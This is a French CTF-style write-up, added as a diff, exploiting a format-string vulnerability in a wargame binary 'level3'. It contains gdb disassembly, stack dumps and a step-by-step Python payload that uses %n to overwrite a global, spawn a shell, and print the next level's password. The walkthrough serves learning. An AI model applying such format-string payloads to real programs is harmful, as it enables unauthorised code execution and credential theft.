@@ -1,0 +1,348 @@
+Je commence par desassembler le binaire level3 dans ghidra
+
+Il y a une fonction v() en plus de la fonction main()
+
+La fonction main() appelle la fonction v() puis retourne
+La fonction v() fait un appel a fgets d'une taille de 512 dans un buffer de 520 puis appelle printf() avec le buffer rempli par fgets en argument.
+Il y a ensuite une condition:
+
+Si m vaut 0x40, le binaire print "Wait what?" puis lance un shell avec system("/bin/sh")
+
+Je comprend immediatement que mon but est d'arriver a rentrer dans cette condition pour obtenir le shell et utiliser cat sur le mot de passe de level4.
+
+Apres quelques recherches je comprend que je ne peux pas exploiter fgets parce qu'il lit une taille inferieur a celle du buffer dans lequel il stocke les donnees lues.
+
+En creusant un petit peu du cote de printf je tombe sur plusieurs documentation sur les "Format string exploitations"
+
+Je me renseigne alors sur cette maniere d'exploiter un binaire et decouvre qu'il est possible d'afficher des zones memoires grace a un printf dont l'entree n'est pas verifiee et meme d'ecrire dans des zones memoires.
+
+mon but est donc de reussir a ecrire sur la zone memoire de la variable m pour lui donner la valeur 0x40 et ainsi obtenir le shell.
+
+Pour commencer il faut que je trouve la zone memoire sur laquelle je peux ecrire grace a ce printf:
+
+Pour cela je vais commencer par poser un breakpoint juste apres l'appel a printf dans gdb et je vais input au binaire une chaine de caractere qui va me permettre d'obtenir des informations sur la zone memoire que je peux manipuler.
+
+$>gdb level3
+(gdb)disas v
+Dump of assembler code for function v:
+   0x080484a4 <+0>:	push   %ebp
+   0x080484a5 <+1>:	mov    %esp,%ebp
+   0x080484a7 <+3>:	sub    $0x218,%esp
+   0x080484ad <+9>:	mov    0x8049860,%eax
+   0x080484b2 <+14>:	mov    %eax,0x8(%esp)
+   0x080484b6 <+18>:	movl   $0x200,0x4(%esp)
+   0x080484be <+26>:	lea    -0x208(%ebp),%eax
+   0x080484c4 <+32>:	mov    %eax,(%esp)
+   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
+   0x080484cc <+40>:	lea    -0x208(%ebp),%eax
+   0x080484d2 <+46>:	mov    %eax,(%esp)
+   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
+   0x080484da <+54>:	mov    0x804988c,%eax
+   0x080484df <+59>:	cmp    $0x40,%eax
+   0x080484e2 <+62>:	jne    0x8048518 <v+116>
+   0x080484e4 <+64>:	mov    0x8049880,%eax
+   0x080484e9 <+69>:	mov    %eax,%edx
+   0x080484eb <+71>:	mov    $0x8048600,%eax
+   0x080484f0 <+76>:	mov    %edx,0xc(%esp)
+   0x080484f4 <+80>:	movl   $0xc,0x8(%esp)
+   0x080484fc <+88>:	movl   $0x1,0x4(%esp)
+   0x08048504 <+96>:	mov    %eax,(%esp)
+   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
+   0x0804850c <+104>:	movl   $0x804860d,(%esp)
+   0x08048513 <+111>:	call   0x80483c0 <system@plt>
+   0x08048518 <+116>:	leave
+   0x08048519 <+117>:	ret
+End of assembler dump.
+
+Je vais mettre mon breakpoint sur l'instruction qui suit l'appel a printf donc a l'adresse 0x080484da
+
+Le programme attend un input, je vais lui donner "AAAA.%x.%x.%x.%x."
+
+(gdb)b *0x080484da
+(gdb)r
+Starting program: /home/user/level3/level3
+AAAA.%x.%x
+AAAA.200.b7fd1ac0
+
+Le programme print "AAAA.200.b7fd1ac0".
+Qu'est ce qui s'est passe ?
+
+La conversion %x de printf permet d'afficher une adresse memoire, en en mettant plus que le nombre d'argument donne a printf il va afficher les adresses des zones memoires a cote de son buffer.
+
+Si je recherche dans la frame a ce meme contexte (au breakpoint que j'ai pose plus tot) je peux peut etre trouver la meme sequence d'adresses.
+
+Pour examiner cette frame je lance x/32x $esp
+
+(gdb)x/32x $esp
+0xbffff4e0:	0xbffff4f0	0x00000200	0xb7fd1ac0	0xb7ff37d0
+0xbffff4f0:	0x41414141	0x2e78252e	0x000a7825	0xb7fef305
+0xbffff500:	0xbffff558	0xb7fde2d4	0xb7fde334	0x00000007
+0xbffff510:	0x00000000	0xb7fde000	0xb7fff53c	0xbffff558
+0xbffff520:	0x00000040	0x00000b80	0x00000000	0xb7fde714
+0xbffff530:	0x00000098	0x0000000b	0x00000000	0x00000000
+0xbffff540:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffff550:	0x00000000	0xb7fe765d	0xb7e3ebaf	0x080482bb
+
+Sur la deuxieme ligne je retrouve une adresse qui vaut 0x41414141, il sagit de mes 4 'A'.
+Sur la premiere ligne je retrouve la sequence que je cherche:
+0x00000200	0xb7fd1ac0
+
+La sequence commence exactement 4 sections avant l'adresse qui a ete ecrite avec les 'A', donc il me faut 4 specificateurs de format dans printf pour arriver a cette adresse.
+En effet si je run a nouveau le binaire mais avec 4 sepcificateurs cette fois ci on obtient:
+
+(gdb)r
+Starting program: /home/user/level3/level3
+AAAA.%x.%x.%x.%x.
+AAAA.200.b7fd1ac0.b7ff37d0.41414141.
+
+On obtient la sequence entiere, jusqu'a nos 'A', aka la zone memoire ou je peut ecrire.
+
+Maintenant que je sais ou je dois ecrire, il me faut l'adresse de la variable m.
+
+(gdb)p &m
+$1 = (<data variable, no debug info> *) 0x804988c
+
+L'adresse de m est 0x804988c
+
+Je peux maintenant commencer a ecrire mon script d'exploitation.
+
+Je vais ecrire ce script en python etape par etape:
+
+Je commence simplement par me mettre les droits sur le dossier et creer un fichier script.py
+
+$>chmod 777 .
+$>touch script.py
+$>chmod 777 script.py
+
+Premiere etape: ecrire le bon nombre de specificateurs de format pour arriver a l'adresse modifiable.
+
+#!/usr/bin/env python
+
+import os
+import struct
+
+def main():
+    payload = "AAAA"
+    payload += "%x."*4
+    print payload
+
+main()
+
+Je test:
+
+$> ./script.py | ./level3
+AAAA200.b7fd1ac0.b7ff37d0.41414141.
+
+J'ai bien recupere l'adresse qui m'interesse.
+
+
+Deuxieme etape: remplacer les A par l'adresse de m, parce que c'est a cette adresse la qu'on veut ecrire
+
+#!/usr/bin/env python
+
+import os
+import struct
+
+def main():
+    payload = ""
+    payload += struct.pack("I", 0x804988c)
+    payload += "%x."*4
+    print payload
+
+main()
+
+Je test:
+
+$> ./srcipt.py | ./level3
+�200.b7fd1ac0.b7ff37d0.804988c.
+
+J'ai bien remplace les 'A' par l'adresse de m
+
+
+Troisieme etape: Ecrire
+
+Si le specificateur %x permet de lire, le specificateur %n permet lui d'ecrire.
+
+Le %n doit lire l'adresse a laquelle nous souhaitons ecrire, l'adresse de la variable m
+Je remplace donc le dernier %x par un %n pour qu'il n'affiche pas l'adresse mais qu'il la lise.
+Le script ressemble desormais a ca:
+
+#!/usr/bin/env python
+
+import os
+import struct
+
+def main():
+    payload = ""
+    payload += struct.pack("I", 0x804988c)
+    payload += "%x."*3
+    payload += "%n."
+    print payload
+
+main()
+
+Je test:
+
+$> ./script.py | ./level3
+�200.b7fd1ac0.b7ff37d0..
+
+La valeur a bien ete lue, on a le '.' du %n qui apparait a la fin de la chaine.
+
+
+Derniere etape: ecrire la valeur 0x40 dans la variable m
+
+Pour cela il faut ecrire la valeur qu'on souhaite ajouter dans un specificateur de format %x avant le %n
+
+=> %<value>x
+
+La valeur va s'ajouter a celle deja presente a l'adresse sur laquelle on ecrit.
+Pour connaitre la valeur de cette adresse au moment du 'if' il suffit de poser un breakpoint a ce meme moment dans gdb et de regarder la valeur contenue dans eax:
+
+Je vais commencer en testant avec un 0 pour avoir la valeur de eax non modifee, le script ressemble a ca:
+
+
+#!/usr/bin/env python
+
+import os
+import struct
+
+def main():
+    payload = ""
+    payload += struct.pack("I", 0x804988c)
+    payload += "%x."*2
+    payload += "%0x."
+    payload += "%n."
+    print payload
+
+main()
+
+
+
+Avant il faut seulement ecrire l'output de mon script dans un fichier pour l'utiliser en input dans gdb:
+
+$> ./script.py > out
+$>chmod 777 out
+
+(gdb)disas v
+Dump of assembler code for function v:
+   0x080484a4 <+0>:	push   %ebp
+   0x080484a5 <+1>:	mov    %esp,%ebp
+   0x080484a7 <+3>:	sub    $0x218,%esp
+   0x080484ad <+9>:	mov    0x8049860,%eax
+   0x080484b2 <+14>:	mov    %eax,0x8(%esp)
+   0x080484b6 <+18>:	movl   $0x200,0x4(%esp)
+   0x080484be <+26>:	lea    -0x208(%ebp),%eax
+   0x080484c4 <+32>:	mov    %eax,(%esp)
+   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
+   0x080484cc <+40>:	lea    -0x208(%ebp),%eax
+   0x080484d2 <+46>:	mov    %eax,(%esp)
+   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
+   0x080484da <+54>:	mov    0x804988c,%eax
+   0x080484df <+59>:	cmp    $0x40,%eax
+   0x080484e2 <+62>:	jne    0x8048518 <v+116>
+   0x080484e4 <+64>:	mov    0x8049880,%eax
+   0x080484e9 <+69>:	mov    %eax,%edx
+   0x080484eb <+71>:	mov    $0x8048600,%eax
+   0x080484f0 <+76>:	mov    %edx,0xc(%esp)
+   0x080484f4 <+80>:	movl   $0xc,0x8(%esp)
+   0x080484fc <+88>:	movl   $0x1,0x4(%esp)
+   0x08048504 <+96>:	mov    %eax,(%esp)
+   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
+   0x0804850c <+104>:	movl   $0x804860d,(%esp)
+   0x08048513 <+111>:	call   0x80483c0 <system@plt>
+   0x08048518 <+116>:	leave
+   0x08048519 <+117>:	ret
+End of assembler dump.
+
+L'instruction qui nous interesse est le 'if', il se trouve a la ligne ou il y a l'instruction 'cmp', son adresse est 0x080484df
+
+(gdb) b *0x080484df
+Breakpoint 1 at 0x80484df
+(gdb)r < out
+Starting program: /home/user/level3/level3 < out
+�200.b7fd1ac0.b7ff37d0..
+
+Breakpoint 1, 0x080484df in v ()
+(gdb) info register
+eax            0x1a	26
+ecx            0x0	0
+edx            0x0	0
+ebx            0xb7fd0ff4	-1208152076
+esp            0xbffff4e0	0xbffff4e0
+ebp            0xbffff6f8	0xbffff6f8
+esi            0x0	0
+edi            0x0	0
+eip            0x80484df	0x80484df <v+59>
+eflags         0x200286	[ PF SF IF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+
+On voit ici que eax vaut 0x1a soit 26 en decimal, notre but est de lui donner la valeur 0x40 soit 64 en decimal.
+
+64 - 26 = 36
+
+Mais les specificateurs de formats et les '.' que j'ai mit dans le buffer de printf comptent egalement on a donc:
+
+36 + 10 = 46
+
+Il faut que j'ecrive la valeur 46 dans m.
+
+Le script final est le suivant:
+
+
+#!/usr/bin/env python
+
+import os
+import struct
+
+def main():
+    payload = ""
+    payload += struct.pack("I", 0x804988c)
+    payload += "%x."*2
+    payload += "%46x."
+    payload += "%n."
+    print payload
+
+main()
+
+Je test d'abord dans gdb:
+
+(gdb)b *0x080484df
+(gdb)r < out
+Starting program: /home/user/level3/level3 < out
+�200.b7fd1ac0.                                      b7ff37d0..
+
+Breakpoint 1, 0x080484df in v ()
+(gdb) info register
+eax            0x40	64
+ecx            0x0	0
+edx            0x0	0
+ebx            0xb7fd0ff4	-1208152076
+esp            0xbffff4e0	0xbffff4e0
+ebp            0xbffff6f8	0xbffff6f8
+esi            0x0	0
+edi            0x0	0
+eip            0x80484df	0x80484df <v+59>
+eflags         0x200286	[ PF SF IF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+
+Et voila, la valeur de eax a bien ete changee pour 0x40 au moment du 'if', il est temps de tester sans gdb:
+
+Je dois ecrire le renvoi du script dans un fichier puis le passer a level3 par un pipe en utilisant le '-' pour garder le shell actif.
+
+$>./script.py > out && cat out - | ./level3
+�200.b7fd1ac0.                                      b7ff37d0..
+Wait what?!
+cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+
+
